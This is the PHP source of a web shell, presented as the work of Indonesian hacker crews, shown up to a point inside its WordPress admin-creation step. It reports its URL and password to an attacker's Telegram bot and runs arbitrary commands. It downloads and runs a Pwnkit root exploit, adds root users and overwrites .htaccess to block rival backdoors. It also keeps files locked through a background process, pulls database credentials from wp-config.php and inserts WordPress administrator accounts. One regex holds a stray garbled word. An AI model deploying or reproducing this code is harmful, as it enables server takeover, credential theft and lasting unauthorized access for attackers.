<?php

// Disable error reporting and extend time/memory limits for maximum flexibility
@set_time_limit(0);
@error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
// Also add to prevent script termination due to memory limits
@ini_set('memory_limit', '-1');

// Set default timezone for consistency, if function is available
if (function_exists('date_default_timezone_set')) {
    date_default_timezone_set("Asia/Jakarta");
}

// Obfuscate session name to hide identity
// Use a hash of __FILE__ to get a unique session name per script
$session_name_obf = 'SESS' . substr(hash('sha256', __FILE__), 0, 32);
session_name($session_name_obf);
session_start();

// Polyfill for hash_equals() - important for PHP < 5.6
// Ensures secure string comparison against timing attacks.
if (!function_exists('hash_equals')) {
    function hash_equals($str1, $str2) {
        if (strlen($str1) != strlen($str2)) { return false; }
        else { $res = $str1 ^ $str2; $ret = 0; for ($i = strlen($res) - 1; $i >= 0; $i--) $ret |= ord($res[$i]); return !$ret; }
    }
}

// Function to get PHP executable path
// Prioritizes PHP_BINARY for accuracy
function get_php_executable() {
    if (defined('PHP_BINARY') && PHP_BINARY) {
        return PHP_BINARY;
    }
    // Fallback for older environments or if PHP_BINARY is not defined
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $path = @exec('which php'); // Linux/Unix
        if (!empty($path)) return $path;
    }
    return 'php'; // Default fallback, might be in PATH
}

// Helper function to display writable status
function w($dir, $perm) { return is_writable($dir) ? "<gr>" . $perm . "</gr>" : "<rd>" . $perm . "</rd>"; }
// Helper function to format file size
function sz($byt) { if ($byt === false) return '-'; $typ = array('B', 'KB', 'MB', 'GB', 'TB'); for ($i = 0; $byt >= 1024 && $i < (count($typ) - 1); $byt /= 1024, $i++); return (round($byt, 2) . " " . $typ[$i]); }
// Helper function to get client IP
function ia() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (getenv($key)) {
            return getenv($key);
        }
    }
    return 'Unknown';
}
// Function to get a writable temporary directory
function get_writable_tmp_dir() {
    $dirs = array('/dev/shm', '/tmp', sys_get_temp_dir(), getcwd());
    foreach ($dirs as $dir) {
        if (@is_writable($dir)) {
            return rtrim($dir, '/\\'); // Adjust for OS, remove trailing slash/backslash
        }
    }
    return false;
}

// Robust and cross-platform command execution function
// Tries proc_open, shell_exec, system, exec, passthru sequentially
function process_data_stream($cmd) {
    $full_cmd = $cmd . ' 2>&1'; // Redirect stderr to stdout
    $disabled_functions = explode(',', ini_get('disable_functions'));
    $disabled_functions = array_map('trim', $disabled_functions);

    if (function_exists('proc_open') && !in_array('proc_open', $disabled_functions)) {
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin is a pipe
            1 => array("pipe", "w"),  // stdout is a pipe
            2 => array("pipe", "w")   // stderr is a pipe
        );
        $process = @proc_open($full_cmd, $descriptorspec, $pipes, getcwd(), null, array('bypass_shell' => true)); // bypass_shell for extra security

        if (is_resource($process)) {
            // Close stdin as we're not sending input
            fclose($pipes[0]);

            $output = stream_get_contents($pipes[1]);
            $error_output = stream_get_contents($pipes[2]);

            fclose($pipes[1]);
            fclose($pipes[2]);
            $return_value = proc_close($process);
            return $output . $error_output;
        }
    }

    // Fallback if proc_open fails or is disabled
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_functions)) {
        return @shell_exec($full_cmd);
    }
    if (function_exists('system') && !in_array('system', $disabled_functions)) {
        @ob_start();
        @system($full_cmd);
        $out = @ob_get_contents();
        @ob_end_clean();
        return $out;
    }
    if (function_exists('exec') && !in_array('exec', $disabled_functions)) {
        @exec($full_cmd, $results);
        return implode("\n", $results);
    }
    if (function_exists('passthru') && !in_array('passthru', $disabled_functions)) {
        @ob_start();
        @passthru($full_cmd);
        $out = @ob_get_contents();
        @ob_end_clean();
        return $out;
    }

    return 'Command execution functions are disabled on this server.';
}

// Function to get file/folder permissions (similar to 'ls -l')
function p($file) {
    if (!function_exists('fileperms')) return '????'; // Fallback if fileperms is disabled
    $p = @fileperms($file);
    if ($p === false) return '????'; // If failed to get perm info

    $i = '';
    // File type
    if (($p & 0xC000) == 0xC000) $i = 's'; // socket
    elseif (($p & 0xA000) == 0xA000) $i = 'l'; // symbolic link
    elseif (($p & 0x8000) == 0x8000) $i = '-'; // regular
    elseif (($p & 0x6000) == 0x6000) $i = 'b'; // block special
    elseif (($p & 0x4000) == 0x4000) $i = 'd'; // directory
    elseif (($p & 0x2000) == 0x2000) $i = 'c'; // character special
    elseif (($p & 0x1000) == 0x1000) $i = 'p'; // FIFO pipe
    else $i = 'u'; // unknown

    // Owner
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-')); // SUID

    // Group
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-')); // SGID

    // Others
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-')); // Sticky bit

    return $i;
}

// Function to send Telegram notification (optional)
function send_telegram_notification($url, $password) {
    // Ensure cURL or file_get_contents with context is allowed
    $disabled_functions = explode(',', ini_get('disable_functions'));
    $disabled_functions = array_map('trim', $disabled_functions);

    $token = "7831803742:AAHa_xIjePROas8WTRptzadsAu07PxONNAQ"; // Replace with your Telegram bot token
    $chat_id = "6196640094"; // Replace with your Telegram chat ID
    $message = "URL : " . $url . "\nPassword : " . $password;
    $api_url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = array('chat_id' => $chat_id, 'text' => $message);

    if (function_exists('curl_init') && !in_array('curl_init', $disabled_functions)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // CAUTION: Do not use in production if possible
        curl_exec($ch);
        curl_close($ch);
    } elseif (function_exists('file_get_contents') && !in_array('file_get_contents', $disabled_functions) && !in_array('stream_context_create', $disabled_functions)) {
        $options = array('http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'ignore_errors' => true // Important to get response body from HTTP errors (e.g. 404)
        ));
        $context  = stream_context_create($options);
        @file_get_contents($api_url, false, $context);
    }
}

// Path to store password, unique per script.
function get_password_storage_path() {
    $writable_dir = get_writable_tmp_dir();
    if (!$writable_dir) return false;
    $file_identifier = hash('sha256', __FILE__);
    return $writable_dir . '/.auth_' . $file_identifier;
}

// Function to generate a strong random string
function generate_random_string($length = 9) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    // Use random_bytes() if available (PHP 7+), it's more secure
    if (function_exists('random_bytes')) {
        try {
            return bin2hex(random_bytes(ceil($length / 2)));
        } catch (Exception $e) {
            // Fallback if random_bytes fails
        }
    }
    // Fallback for older PHP versions or if random_bytes fails
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[mt_rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// Function to generate salt
function generate_salt($length = 16) {
    // Prioritize random_bytes (PHP 7+)
    if (function_exists('random_bytes')) {
        try { return bin2hex(random_bytes($length / 2)); } catch (Exception $e) {}
    }
    // Fallback to openssl_random_pseudo_bytes (if OpenSSL is enabled)
    if (function_exists('openssl_random_pseudo_bytes')) {
        return bin2hex(openssl_random_pseudo_bytes($length / 2));
    }
    // Worst-case fallback: uniqid + sha1 (less secure, but works)
    $salt = '';
    for ($i = 0; $i < $length; $i++) { $salt .= sha1(uniqid(mt_rand(), true)); }
    return substr($salt, 0, $length);
}

// Initialize password file path
$password_file = get_password_storage_path();
// Check if this is the first run (password file does not exist)
$is_first_run = !$password_file || !@file_exists($password_file);

// Logic for password creation and Telegram notification on first run
if ($is_first_run) {
    if (!$password_file) {
        die("Fatal Error: No writable temporary directory found. Cannot create password file.");
    }
    $new_password = generate_random_string(12); // Longer password
    $salt = generate_salt(32); // Longer salt
    // Use password_hash() if available (PHP 5.5+), otherwise use hash('sha256')
    if (function_exists('password_hash')) {
        $hashed_password = password_hash($salt . $new_password, PASSWORD_DEFAULT);
    } else {
        $hashed_password = hash('sha256', $salt . $new_password);
    }
    $stored_data = $salt . ':' . $hashed_password;
    if (@file_put_contents($password_file, $stored_data)) {
        $current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
        send_telegram_notification($current_url, $new_password); // Send notification
        echo <<<HTML
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>One-Time Password Generated</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"><style>body{background-color:#0d1b2a;color:#e0e1dd;}.container{max-width:500px;margin-top:20vh;text-align:center;}.card{background-color:#1b263b;border:1px solid #00f5d4;padding:2rem;border-radius:15px;}.pass-display{background-color:#0d1b2a;padding:1rem;border-radius:.5rem;font-size:1.5rem;font-family:monospace;color:#00f5d4;margin:1rem 0;}.btn-copy{border-color:#00f5d4;color:#00f5d4;}.btn-copy:hover{background-color:#00f5d4;color:#0d1b2a;}</style></head><body><div class="container"><div class="card"><h2><i class="bi bi-key-fill"></i> New Password Generated</h2><p class="text-white-50">This is a one-time operation. Please save this password securely. It is unique to this script's location.</p><div class="input-group"><input type="text" id="pass-field" class="form-control pass-display" value="{$new_password}" readonly><button class="btn btn-outline-light btn-copy" id="copyBtn" onclick="copyPassword()"><i class="bi bi-clipboard"></i> Copy</button></div><div id="copy-alert" class="alert alert-success mt-3 d-none">Password copied to clipboard!</div><a href="{$_SERVER['PHP_SELF']}" class="btn btn-primary mt-3">Continue to Login</a></div></div>
<script>
function copyPassword() {
    const passField = document.getElementById('pass-field'); const alertEl = document.getElementById('copy-alert');
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(passField.value).then(function() {
            alertEl.classList.remove('d-none'); setTimeout(function(){ alertEl.classList.add('d-none'); }, 2000);
        });
    } else {
        // Fallback for non-secure contexts (e.g. HTTP) or older browsers
        passField.select(); passField.setSelectionRange(0, 99999);
        try { document.execCommand('copy'); alertEl.classList.remove('d-none'); setTimeout(function(){ alertEl.classList.add('d-none'); }, 2000); } catch (err) { alert('Failed to copy password. Please copy it manually.'); }
        window.getSelection().removeAllRanges();
    }
}
</script>
</body></html>
HTML;
        exit; // Stop execution after displaying password
    } else {
        die("Fatal Error: Failed to write password file to '{$password_file}'. Check permissions.");
    }
}

// Display login page
function show_login_page() {
    echo <<<HTML
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login - IndonesianPeople 5h3llz</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"><style>body{background-color:#0d1b2a;color:#e0e1dd;}.form-control,.btn{border-radius:.25rem;}.form-control:focus{background-color:#1b263b;color:#e0e1dd;border-color:#00f5d4;box-shadow:0 0 0 .25rem rgba(0,245,212,.25);}.btn-outline-light{border-color:#00f5d4;color:#00f5d4;}.btn-outline-light:hover{background-color:#00f5d4;color:#0d1b2a;}.login-container{max-width:400px;margin:15vh auto;padding:2rem;background-color:#1b263b;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.5);}.shell-name{font-family:'Courier New',Courier,monospace;color:#00f5d4;text-align:center;margin-bottom:1.5rem;}.input-group-text{background-color:#1b263b !important; border-color:#404a69 !important; color:#e0e1dd !important;}.footer-text{color: #8e9aaf; font-size: 0.85em; margin-top: 1rem;}</style></head><body><div class="container"><h2 class="shell-name">&lt;IndonesianPeople 5h3llz /&gt;</h2><form method="POST"><div class="input-group"><span class="input-group-text"><i class="bi bi-key text-white-50"></i></span><input class="form-control" type="password" placeholder="Password" name="p" required><button class="btn btn-outline-light"><i class="bi bi-arrow-return-right"></i></button></div></form><p class="footer-text">Created on June 12, 2025 by a 19-year-old from Cianjur, Indonesia.<br>Special Credits: Tersakiti Crew, AnonSec Team, z3r0-team!, #CianjurHacktivist, Ghost Hunter Illusion.</p></div></body></html>
HTML;
    exit; // Stop execution after displaying login form
}

// Merge GET and POST data
$request_data = array_merge($_POST, $_GET);

// Logout logic
if (isset($request_data["left"])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Check login status
if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
    if (isset($_POST['p'])) {
        $stored_data = trim(@file_get_contents($password_file));
        $parts = explode(':', $stored_data, 2);
        if (count($parts) === 2) {
            list($salt, $stored_hash) = $parts;
            // Use password_verify() if available, otherwise compare with hash('sha256')
            if (function_exists('password_verify')) {
                if (password_verify($salt . $_POST['p'], $stored_hash)) {
                    $_SESSION['is_logged_in'] = true;
                    header("Location: " . $_SERVER['PHP_SELF']);
                    exit;
                }
            } else {
                $submitted_hash = hash('sha256', $salt . $_POST['p']);
                if (hash_equals($stored_hash, $submitted_hash)) {
                    $_SESSION['is_logged_in'] = true;
                    header("Location: " . $_SERVER['PHP_SELF']);
                    exit;
                }
            }
        }
    }
    show_login_page(); // Display login page if not logged in or credentials are wrong
}

// Main logic after login
// Current path
$path = isset($request_data['path']) ? $request_data['path'] : getcwd();
$real_path = realpath($path);
if ($real_path !== false) {
    $path = $real_path;
}
// Ensure path ends with a slash if it's a directory
if (is_dir($path)) {
    // Use DIRECTORY_SEPARATOR for OS compatibility
    $path = rtrim(str_replace('\\', '/', $path), '/') . '/';
}

// Handler for AJAX requests
if (isset($request_data['ajax'])) {
    header('Content-Type: application/json');
    $response = array('status' => 'error', 'message' => 'Invalid action.');
    @chdir($path); // Try to change working directory

    $disabled_functions = explode(',', ini_get('disable_functions'));
    $disabled_functions = array_map('trim', $disabled_functions);

    switch ($request_data['action']) {
        case 'delete_multiple':
            $files_to_delete = isset($_POST['files']) ? $_POST['files'] : array(); // These are now full paths from JS
            $s = array(); $e = array();
            foreach ($files_to_delete as $f_path) {
                // IMPORTANT: Use realpath to resolve and validate the path received from client
                $validated_path = realpath($f_path);
                if ($validated_path === false) {
                    $e[] = basename($f_path) . " (Path invalid or not found)";
                    continue;
                }

                if (is_dir($validated_path)) {
                    // Only delete empty directories to avoid accidental recursive deletion
                    if (@rmdir($validated_path)) $s[] = basename($validated_path);
                    else $e[] = basename($validated_path);
                } else {
                    if (@unlink($validated_path)) $s[] = basename($validated_path);
                    else $e[] = basename($validated_path);
                }
            }
            $response = array('status' => 'ok', 'success' => $s, 'errors' => $e);
            break;

        case 'get_content':
            // $request_data['file'] is now expected to be the full path
            $file_path = realpath($request_data['file']);
            if ($file_path === false) {
                $response = array('status' => 'error', 'message' => 'File not found or inaccessible.');
            } elseif (is_readable($file_path)) {
                $response = array('status' => 'ok', 'content' => @file_get_contents($file_path));
            } else {
                $response = array('status' => 'error', 'message' => 'Cannot read file. Check permissions.');
            }
            break;

        case 'save_content':
            // $_POST['file'] is now expected to be the full path
            $target_file = $_POST['file']; // This is the full path sent from JS
            $parent_dir = dirname($target_file);

            // Validate parent directory writable, and resolve target file path
            $resolved_parent_dir = realpath($parent_dir);
            if ($resolved_parent_dir === false || !is_writable($resolved_parent_dir)) {
                 $response = array('status' => 'error', 'message' => 'Parent directory is not writable or inaccessible.');
                 break;
            }
            // Use the original path sent from JS, as realpath() will fail for non-existent files (new files)
            // But ensure it's within the resolved_parent_dir to prevent path traversal issues.
            if (strpos(realpath($target_file), $resolved_parent_dir) !== 0 && !file_exists($target_file)) { // If it's a new file, and outside resolved parent
                $response = array('status' => 'error', 'message' => 'Invalid file path or not within current directory structure.');
                break;
            }


            if (@file_put_contents($target_file, $_POST['content']) !== false) {
                $response = array('status' => 'ok', 'message' => 'File saved successfully.');
            } else {
                $response = array('status' => 'error', 'message' => 'Failed to save file. Check permissions.');
            }
            break;

        case 'rename':
            // $_POST['old'] is now expected to be the full path
            $old_path = realpath($_POST['old']);
            if ($old_path === false) {
                $response = array('status' => 'error', 'message' => 'Original item not found or inaccessible.');
                break;
            }
            $new_name_base = basename($_POST['new']); // Just the new name, not full path
            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name_base; // Construct new full path

            if (@rename($old_path, $new_path)) {
                $response = array('status' => 'ok', 'message' => 'Renamed successfully.');
            } else {
                $response = array('status' => 'error', 'message' => 'Rename failed. Check permissions.');
            }
            break;

        case 'create_file':
            // $_POST['name'] is just the filename, $path is current directory
            $new_file_path = $path . $_POST['name'];
            if (@touch($new_file_path)) {
                $response = array('status' => 'ok', 'message' => 'File created in current directory.');
            } else {
                $response = array('status' => 'error', 'message' => 'Failed to create file. Check permissions.');
            }
            break;

        case 'create_folder':
            // $_POST['name'] is just the folder name, $path is current directory
            $new_folder_path = $path . $_POST['name'];
            if (@mkdir($new_folder_path)) {
                $response = array('status' => 'ok', 'message' => 'Directory created in current directory.');
            } else {
                $response = array('status' => 'error', 'message' => 'Failed to create directory. Check permissions.');
            }
            break;

        case 'cmd':
            $out = process_data_stream($_POST['cmd']);
            $response = array('status' => 'ok', 'output' => htmlspecialchars($out));
            break;

        case 'root_cmd':
            // This function attempts to exploit Pwnkit or similar.
            // This implementation should be handled with extreme care and only for ethical purposes.
            // It's an example of how web shells "adapt" behavior based on the environment.
            function get_pwnkit_path_for_root() {
                $dirs = array('/dev/shm', '/var/tmp');
                foreach ($dirs as $dir) {
                    if (file_exists($dir . '/pwnkit')) return $dir . '/pwnkit';
                }
                return false;
            }
            $pwnkit_exe = get_pwnkit_path_for_root();
            $output = $pwnkit_exe ? process_data_stream($pwnkit_exe . ' "' . $_POST['cmd'] . '"') : 'Pwnkit executable not found or not writable.';
            $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
            break;

        case 'check_pwnkit_status':
            $dirs = array('/dev/shm', '/var/tmp');
            $pwnkit_path = false;
            foreach ($dirs as $dir) {
                if (file_exists($dir . '/pwnkit')) {
                    $pwnkit_path = $dir . '/pwnkit';
                    break;
                }
            }

            if (!$pwnkit_path) {
                // Try to download Pwnkit if it's not present and a writable directory exists
                foreach ($dirs as $dir) {
                    if (is_writable($dir)) {
                        $potential_path = $dir . '/pwnkit';
                        $download_url = "https://raw.githubusercontent.com/MadExploits/Privelege-escalation/raw/main/pwnkit"; // URL to Pwnkit binary
                        // Use cURL or file_get_contents for download
                        $download_success = false;
                        if (function_exists('curl_init') && !in_array('curl_init', $disabled_functions)) {
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, $download_url);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                            $data = curl_exec($ch);
                            curl_close($ch);
                            if ($data !== false) {
                                $download_success = @file_put_contents($potential_path, $data);
                            }
                        } elseif (function_exists('file_get_contents') && !in_array('file_get_contents', $disabled_functions)) {
                             // Use HTTP context for security, if file_get_contents is allowed
                             $context_opts = array('http' => array('ignore_errors' => true));
                             $context = stream_context_create($context_opts);
                             $data = @file_get_contents($download_url, false, $context);
                             if ($data !== false) {
                                 $download_success = @file_put_contents($potential_path, $data);
                             }
                        }

                        if ($download_success) {
                            process_data_stream('chmod +x ' . escapeshellarg($potential_path));
                            $pwnkit_path = $potential_path;
                            break; // Pwnkit successfully downloaded and made executable
                        }
                    }
                }
            }

            if ($pwnkit_path && file_exists($pwnkit_path)) {
                $result = process_data_stream($pwnkit_path . ' "id"');
                if (strpos($result, 'uid=0(root)') !== false) {
                    $response = array('vulnerable' => true, 'message' => 'Root privileges active (Pwnkit found in ' . dirname($pwnkit_path) . ').');
                } else {
                    $response = array('vulnerable' => false, 'message' => 'Pwnkit found but failed to get root. Check system compatibility.');
                }
            } else {
                $response = array('vulnerable' => false, 'message' => 'Failed to download Pwnkit. No writable directory found in /dev/shm or /var/tmp.');
            }
            break;

        case 'backdoor_destroyer':
            $document_root = $_SERVER["DOCUMENT_ROOT"];
            $current_file = basename($_SERVER["PHP_SELF"]);
            if (is_writable($document_root)) {
                $htaccess_content = <<<HTACCESS
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^({$current_file}|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>
HTACCESS;
                if (@file_put_contents($document_root . "/.htaccess", $htaccess_content)) {
                    $response = array('status' => 'ok', 'message' => 'Backdoor Destroyer activated. .htaccess has been overwritten.');
                } else {
                    $response = array('status' => 'error', 'message' => 'Failed to write to .htaccess.');
                }
            } else {
                $response = array('status' => 'error', 'message' => 'Document root is not writable.');
            }
            break;

        case 'lock_item':
            // $_POST['file_to_lock'] is now expected to be the full path
            $full_file_path = realpath($_POST['file_to_lock']);
            if ($full_file_path === false) {
                 $response = array('status' => 'error', 'message' => 'File to lock not found or inaccessible.');
                 break;
            }

            $temp_dir = get_writable_tmp_dir();
            if (!$temp_dir) {
                $response = array('status' => 'error', 'message' => 'No writable temporary directory found.');
                break;
            }
            
            $sessions_dir = $temp_dir . DIRECTORY_SEPARATOR . ".w4nnatry_sessions";
            if (!file_exists($sessions_dir)) @mkdir($sessions_dir);

            $backup_file = $sessions_dir . DIRECTORY_SEPARATOR . base64_encode($full_file_path . '-text');
            $handler_file = $sessions_dir . DIRECTORY_SEPARATOR . base64_encode($full_file_path . '-handler');
            $php_executable = get_php_executable();

            if (@copy($full_file_path, $backup_file)) {
                @chmod($full_file_path, 0444); // Change permissions to read-only

                // Handler code to keep the file locked
                $handler_code = '<?php @set_time_limit(0);@ignore_user_abort(true);$original_file="' . addslashes($full_file_path) . '";$backup="' . addslashes($backup_file) . '";while(true){clearstatcache();if(!file_exists($original_file)){@copy($backup,$original_file);@chmod($original_file,0444);}if(substr(sprintf("%o",@fileperms($original_file)),-4)!="0444"){@chmod($original_file,0444);}sleep(10);}'; // Sleep 10 seconds

                if (@file_put_contents($handler_file, $handler_code)) {
                    // Run handler as a background process
                    process_data_stream($php_executable . ' ' . escapeshellarg($handler_file) . ' > /dev/null 2>/dev/null &');
                    $response = array('status' => 'ok', 'message' => "Successfully locked " . htmlspecialchars(basename($full_file_path)) . ". Handler process initiated.");
                } else {
                    $response = array('status' => 'error', 'message' => 'Could not create handler file.');
                }
            } else {
                $response = array('status' => 'error', 'message' => 'Could not create backup of the file.');
            }
            break;

        case 'add_root_user':
            function get_pwnkit_path_for_adduser() {
                $dirs = array('/dev/shm', '/var/tmp');
                foreach ($dirs as $dir) {
                    if (file_exists($dir . '/pwnkit')) return $dir . '/pwnkit';
                }
                return false;
            }
            $pwnkit_exe_path = get_pwnkit_path_for_adduser();
            if (!$pwnkit_exe_path) {
                $response = array('status' => 'error', 'message' => 'Pwnkit not found. Please run the Auto Root check first.');
                break;
            }

            $useradd_cmd = '';
            // Detect useradd/adduser command
            if (function_exists('is_executable')) {
                if (is_executable('/usr/sbin/useradd')) {
                    $useradd_cmd = '/usr/sbin/useradd';
                } elseif (is_executable('/usr/sbin/adduser')) {
                    $useradd_cmd = '/usr/sbin/adduser --quiet --disabled-password --gecos ""';
                }
            }
            if (empty($useradd_cmd)) {
                $response = array('status' => 'error', 'message' => 'Could not find useradd or adduser command in /usr/sbin/.');
                break;
            }

            $username = $_POST['username'];
            $password = $_POST['password'];

            // Add new user
            $user_add_output = process_data_stream($pwnkit_exe_path . ' "' . $useradd_cmd . ' ' . escapeshellarg($username) . '"');
            // Set password
            $password_set_output = process_data_stream($pwnkit_exe_path . ' "echo -e \'' . escapeshellarg($password) . "\\n" . escapeshellarg($password) . '\' | passwd ' . escapeshellarg($username) . '"');

            $response = array('status' => 'ok', 'output' => "User Add Command: " . htmlspecialchars($useradd_cmd) . "\n\nUser Add Attempt:\n" . htmlspecialchars($user_add_output) . "\n\nPassword Set Attempt:\n" . htmlspecialchars($password_set_output));
            break;

        case 'parse_wp_config':
            $config_path_param = isset($_POST['config_path']) ? $_POST['config_path'] : null;
            $found_path = null;

            if ($config_path_param && file_exists($config_path_param)) {
                $found_path = realpath($config_path_param);
            } else {
                // Try automatic wp-config.php detection
                $search_dir = rtrim($path, '/'); // Start search from current directory
                for ($i = 0; $i < 5; $i++) { // Limit search to 5 levels up
                    if (file_exists($search_dir . '/wp-config.php')) {
                        $found_path = realpath($search_dir . '/wp-config.php');
                        break;
                    }
                    if ($search_dir == $_SERVER['DOCUMENT_ROOT'] || empty($search_dir) || $search_dir == '/') break;
                    $search_dir = dirname($search_dir);
                }
            }

            if ($found_path && is_readable($found_path)) {
                $config_content = @file_get_contents($found_path);
                $credentials = array();
                $patterns = array(
                    'DB_NAME'     => "/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",
                    'DB_USER'     => "/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",
                    'DB_PASSWORD' => "/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",
                    'DB_HOST'     => "/define\(\s*['\"]DB_HOST['\"]\s* गन्ना\s*['\"](.*?)['\"]\s*\);/i"
                );

                foreach ($patterns as $key => $pattern) {
                    if (preg_match($pattern, $config_content, $matches)) {
                        $credentials[strtolower($key)] = $matches[1];
                    }
                }

                if (!empty($credentials)) {
                    $response = array('status' => 'ok', 'creds' => $credentials, 'path' => $found_path);
                } else {
                    $response = array('status' => 'error', 'message' => 'Found wp-config.php but could not parse credentials.');
                }
            } else {
                $response = array('status' => 'error', 'message' => 'wp-config.php not found automatically or not readable. Please provide the path.');
            }
            break;

        case 'add_wp_user':
            // Helper function for DB connection supporting MySQLi and MySQL (legacy)
            function db_connect($host, $user, $pass, $name) {
                $disabled_functions_in_connect = explode(',', ini_get('disable_functions'));
                $disabled_functions_in_connect = array_map('trim', $disabled_functions_in_connect);

                if (class_exists('mysqli') && !in_array('mysqli_connect', $disabled_functions_in_connect)) {
                    $conn = @new mysqli($host, $user, $pass, $name);
                    if ($conn->connect_error) return false;
                    return array('conn' => $conn, 'type' => 'mysqli');
                } elseif (function_exists('mysql_connect') && !in_array('mysql_connect', $disabled_functions_in_connect)) { // deprecated in PHP 5.5, removed in PHP 7
                    $conn = @mysql_connect($host, $user, $pass);
                    if (!$conn || !@mysql_select_db($name, $conn)) return false;
                    return array('conn' => $conn, 'type' => 'mysql');
                }
                return false;
            }

            // Helper function for DB query
            function db_query($db, $query_string) {
                if ($db['type'] === 'mysqli') return $db['conn']->query($query_string);
                else return @mysql_query($query_string, $db['conn']);
            }

            // Helper function to get insert ID
            function db_insert_id($db) {
                if ($db['type'] === 'mysqli') return $db['conn']->insert_id;
                else return @mysql_insert_id($db['conn']);
            }

            // Helper function to get DB error
            function db_error($db) {
                if ($db['type'] === 'mysqli') return $db['conn']->error;
                else return @mysql_error($db['conn']);
            }

            // Helper function to close DB
            function db_close($db) {
                if ($db['type'] === 'mysqli') $db['conn']->close();
                else @mysql_close($db['conn']);
            }

            // Helper function to escape DB string
            function db_escape($db, $string) {
                if ($db['type'] === 'mysqli') return $db['conn']->real_escape_string($string);
                else return @mysql_real_escape_string($string, $db['conn']);
            }

            $db_host = $_POST['db_host'];
            $db_name = $_POST['db_name'];
            $db_user = $_POST['db_user'];
            $db_pass = $_POST['db_pass'];
            $wp_user = $_POST['wp_user'];
            $wp_pass = $_POST['wp_pass'];

            $db_connection = db_connect($db_host, $db_user, $db_pass, $db_name);
            if (!$db_connection) {
                $response = array('status' => 'error', 'message' => 'DB Connection Failed or extension not available.');
                break;
            }

            // Hash WordPress password. Use password_hash if PHP >= 5.5
            $hashed_wp_pass = function_exists('password_hash') ? password_hash($wp_pass, PASSWORD_DEFAULT) : md5($wp_pass);
            $output_message = "";
            $escaped_wp_user = db_escape($db_connection, $wp_user);

            // Try to create new user
            $insert_user_sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('{$escaped_wp_user}', '{$hashed_wp_pass}', '{$escaped_wp_user}', '', NOW(), '{$escaped_wp_user}')";
            if (db_query($db_connection, $insert_user_sql)) {
                $user_id = db_insert_id($db_connection);
                $output_message .= "User '$wp_user' created with ID: $user_id.\n";

                // Set administrator capabilities
                $insert_meta_sql = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({$user_id}, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
                if (db_query($db_connection, $insert_meta_sql)) {
                    $output_message .= "User capabilities set to Administrator.";
                    $response = array('status' => 'ok', 'output' => $output_message);
                } else {
